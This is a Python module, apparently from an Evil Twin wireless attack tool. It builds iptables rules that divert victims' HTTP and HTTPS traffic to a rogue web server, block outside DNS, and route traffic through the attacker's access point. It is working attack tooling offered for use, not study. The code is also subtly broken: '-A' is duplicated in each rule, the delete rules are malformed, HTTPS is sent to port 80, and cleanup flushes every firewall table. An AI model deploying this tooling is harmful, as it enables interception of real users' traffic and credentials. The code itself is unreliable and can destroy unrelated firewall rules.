# src/core/traffic_redirector.py
"""
Traffic Redirector: Manages iptables rules for redirecting network traffic,
crucial for intercepting client requests in an Evil Twin attack.
"""

import subprocess
import shlex
from typing import List

from base.logger import logger
from helpers import shelltools


class TrafficRedirector:
    """
    Manages iptables rules for redirecting traffic, enabling IP forwarding,
    and handling NAT/masquerading for an Evil Twin setup.
    """
    def __init__(self):
        self.logger = logger
        self._applied_rules: List[List[str]] = []
        self._ip_forwarding_enabled: bool = False # Tracks if *we* enabled it via this object

    def _execute_iptables_command(self, cmd_args: List[str], description: str) -> bool:
        """Helper to execute an iptables command and log its status."""
        full_cmd = ["iptables"] + cmd_args
        self.logger.debug(f"[TrafficRedirector] Executing iptables: {shlex.join(full_cmd)}")
        try:
            # shelltools.run_command accepts a list directly
            shelltools.run_command(full_cmd, require_root=True, check=True)
            self.logger.debug(f"[TrafficRedirector] Successfully applied rule: {description}")
            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"[TrafficRedirector] Failed to apply iptables rule ({description}): {e.stderr.strip()}")
            return False
        except Exception as e:
            self.logger.error(f"[TrafficRedirector] Unexpected error applying iptables rule ({description}): {e}")
            return False

    def enable_ip_forwarding(self) -> bool:
        """
        Enables IP forwarding in the kernel (net.ipv4.ip_forward).
        Crucial for routing traffic through the AP.
        """
        self.logger.info("[TrafficRedirector] Enabling IP forwarding...")
        try:
            # sysctl -w is the robust way to set kernel parameters
            shelltools.run_command("sysctl -w net.ipv4.ip_forward=1", require_root=True, check=True)
            self._ip_forwarding_enabled = True # Mark that WE enabled it
            self.logger.info("[TrafficRedirector] IP forwarding enabled.")
            return True
        except Exception as e:
            self.logger.error(f"[TrafficRedirector] Failed to enable IP forwarding: {e}")
            return False

    def setup_redirection_rules(
        self,
        ap_interface: str,      # The interface hosting the rogue AP (e.g., 'at0' or 'wlan0')
        internet_interface: str, # The interface connected to the internet (e.g., 'eth0' or 'wlan1')
        webserver_ip: str,      # The IP address of the rogue AP (our machine's IP on the AP interface)
        webserver_port: int = 80 # The port the rogue web server is listening on
    ) -> bool:
        """
        Sets up iptables rules to redirect HTTP/HTTPS traffic to the local web server
        and enable NAT for internet access (if needed).

        Args:
            ap_interface (str): The interface of the rogue AP.
            internet_interface (str): The interface providing internet access.
            webserver_ip (str): The IP address of the host machine on the AP interface.
            webserver_port (int): The port of the rogue web server.

        Returns:
            bool: True if rules are successfully applied, False otherwise.
        """
        self.logger.info(f"[TrafficRedirector] Setting up traffic redirection rules for {ap_interface}...")

        # Always start with clearing existing rules by this object to avoid conflicts
        # and ensure a clean slate for *our* rules.
        self.clear_redirection_rules() 
        self._applied_rules.clear() # Re-initialize the list of rules this instance applied


        rules_to_apply: List[List[str]] = []

        # --- NAT (Masquerading) for Internet Access ---
        # Allows clients connected to ap_interface to access the internet via internet_interface.
        rules_to_apply.append(["-t", "nat", "-A", "POSTROUTING", "-o", internet_interface, "-j", "MASQUERADE"])

        # --- Traffic Redirection to Local Web Server ---
        # Redirects incoming HTTP traffic on the AP interface to our local web server
        rules_to_apply.append(["-t", "nat", "-A", "PREROUTING", "-i", ap_interface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{webserver_ip}:{webserver_port}"])
        # Redirects incoming HTTPS traffic (Port 443) to local web server
        # Note: Without SSLStrip, this will cause certificate warnings in browsers.
        rules_to_apply.append(["-t", "nat", "-A", "PREROUTING", "-i", ap_interface, "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", f"{webserver_ip}:{webserver_port}"])

        # --- DNS Interception/Blocking (Force use of our dnsmasq) ---
        # This explicit rule ensures external DNS queries from the AP interface are dropped,
        # forcing clients to use the DNS server provided by our dnsmasq (which will be our gateway_ip).
        rules_to_apply.append(["-A", "FORWARD", "-i", ap_interface, "-p", "udp", "--dport", "53", "-j", "DROP"])

        # --- Basic Forwarding Rules (Crucial for traffic to flow) ---
        # Allow forwarding traffic from the AP interface to the internet interface
        rules_to_apply.append(["-A", "FORWARD", "-i", ap_interface, "-o", internet_interface, "-j", "ACCEPT"])
        # Allow forwarding traffic from the internet interface back to the AP interface
        rules_to_apply.append(["-A", "FORWARD", "-i", internet_interface, "-o", ap_interface, "-j", "ACCEPT"])
        # Allow ESTABLISHED,RELATED connections
        rules_to_apply.append(["-A", "FORWARD", "-m", "state", "--state", "ESTABLISHED,RELATED", "-j", "ACCEPT"])
        
        # You may need additional rules depending on your exact setup and what traffic you want to permit/block.
        # For instance, if you want to block all other internet access except for HTTP/HTTPS redirects:
        # rules_to_apply.append(["-A", "FORWARD", "-i", ap_interface, "-j", "DROP"]) # This would drop everything else

        success = True
        for rule_args_list in rules_to_apply: # Renamed loop variable for clarity
            # Prepend '-A' (append) to the rule arguments.
            # _execute_iptables_command expects a list, so pass it directly.
            if not self._execute_iptables_command(["-A"] + rule_args_list, description=f"Rule: {shlex.join(rule_args_list)}"):
                success = False
                break
            # Store the rule to be deleted in reverse order for easy rollback
            self._applied_rules.append(["-D"] + rule_args_list)

        if success:
            self.logger.info("[TrafficRedirector] All traffic redirection rules applied successfully.")
        else:
            self.logger.error("[TrafficRedirector] Failed to apply all traffic redirection rules. Attempting to clear existing rules for rollback.")
            self.clear_redirection_rules() # Attempt full rollback on partial failure
        
        return success


    def clear_redirection_rules(self) -> bool:
        """
        Clears all iptables rules applied by this instance (in _applied_rules)
        and flushes all chains and deletes custom chains for filter, nat, mangle, raw tables.
        Also disables IP forwarding if this instance enabled it.
        This is a destructive operation and should be used with caution.
        """
        self.logger.info("[TrafficRedirector] Clearing all iptables rules...")
        
        cleanup_success = True

        # 1. Attempt to delete rules in reverse order of application
        for rule_args_list in reversed(self._applied_rules): # _applied_rules stores "-D" versions
            if not self._execute_iptables_command(rule_args_list, description=f"Deleting rule: {shlex.join(rule_args_list)}"):
                cleanup_success = False # Log error but try to continue clearing others

        self._applied_rules.clear() # Clear the list of applied rules managed by this instance

        # 2. Flush all chains in filter, nat, mangle, raw tables (force clear everything this instance might have affected)
        # This is a broader cleanup than just _applied_rules, ensuring no lingering rules.
        tables = ["filter", "nat", "mangle", "raw"]
        for table in tables:
            if not self._execute_iptables_command(["-t", table, "-F"], description=f"Flush {table} table"):
                cleanup_success = False
            if not self._execute_iptables_command(["-t", table, "-X"], description=f"Delete custom chains in {table} table"):
                cleanup_success = False # Note: -X will fail if chains are not empty, hence -F first.
        
        # 3. Disable IP forwarding (only if *this instance* enabled it)
        if self._ip_forwarding_enabled:
            self.logger.info("[TrafficRedirector] Disabling IP forwarding (as enabled by this instance)...")
            try:
                shelltools.run_command("sysctl -w net.ipv4.ip_forward=0", require_root=True, check=False)
                self.logger.info("[TrafficRedirector] IP forwarding disabled.")
            except Exception as e:
                self.logger.warning(f"[TrafficRedirector] Failed to disable IP forwarding: {e}")
                cleanup_success = False
        else:
            self.logger.info("[TrafficRedirector] IP forwarding was not enabled by this instance, skipping disable.")

        if cleanup_success:
            self.logger.info("[TrafficRedirector] All traffic redirection rules and IP forwarding cleared successfully.")
        else:
            self.logger.error("[TrafficRedirector] Failed to completely clear all traffic redirection rules or disable IP forwarding.")

        return cleanup_success

    def __del__(self):
        """
        Ensures iptables rules and IP forwarding state are reset when the object is deleted.
        """
        self.logger.debug("[TrafficRedirector] __del__ called for TrafficRedirector. Initiating cleanup...")
        self.clear_redirection_rules() # Call the comprehensive cleanup method
        self.logger.debug("[TrafficRedirector] __del__ cleanup complete.")